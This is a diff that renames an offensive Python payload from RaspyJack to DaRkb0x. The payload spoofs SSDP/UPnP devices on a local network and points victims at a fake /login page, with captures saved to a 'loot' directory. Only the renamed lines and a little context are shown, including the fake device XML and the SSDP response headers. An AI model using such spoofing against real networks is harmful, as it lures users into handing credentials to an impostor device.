@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-RaspyJack Payload -- SSDP/UPnP Device Spoofing
+DaRkb0x Payload -- SSDP/UPnP Device Spoofing
 ===============================================
 Author: 7h30th3r0n3
 
@@ -48,7 +48,7 @@ PINS = {
 WIDTH, HEIGHT = LCD_1in44.LCD_WIDTH, LCD_1in44.LCD_HEIGHT
 ROWS_VISIBLE = 5
 ROW_H = 12
-LOOT_DIR = "/root/Raspyjack/loot/SSDP"
+LOOT_DIR = "/root/DaRkb0x/loot/SSDP"
 
 SSDP_ADDR = "239.255.255.250"
 SSDP_PORT = 1900
@@ -136,7 +136,7 @@ def _build_device_xml(device, ip):
     <modelName>{device['model']}</modelName>
     <modelNumber>1.0</modelNumber>
     <serialNumber>RJ-{int(time.time()) % 100000}</serialNumber>
-    <UDN>uuid:raspyjack-{device['name'].lower()}-001</UDN>
+    <UDN>uuid:darkbox-{device['name'].lower()}-001</UDN>
     <presentationURL>http://{ip}:{HTTP_PORT}/login</presentationURL>
   </device>
 </root>"""
@@ -298,7 +298,7 @@ def _ssdp_thread():
             "HTTP/1.1 200 OK\r\n"
             f"LOCATION: http://{local_ip}:{HTTP_PORT}/device.xml\r\n"
             f"ST: {device['st']}\r\n"
-            "USN: uuid:raspyjack-ssdp-001::upnp:rootdevice\r\n"
+            "USN: uuid:darkbox-ssdp-001::upnp:rootdevice\r\n"
             "CACHE-CONTROL: max-age=1800\r\n"
             f"SERVER: {device['manufacturer']}/{device['model']} UPnP/1.0\r\n"
             "EXT:\r\n"
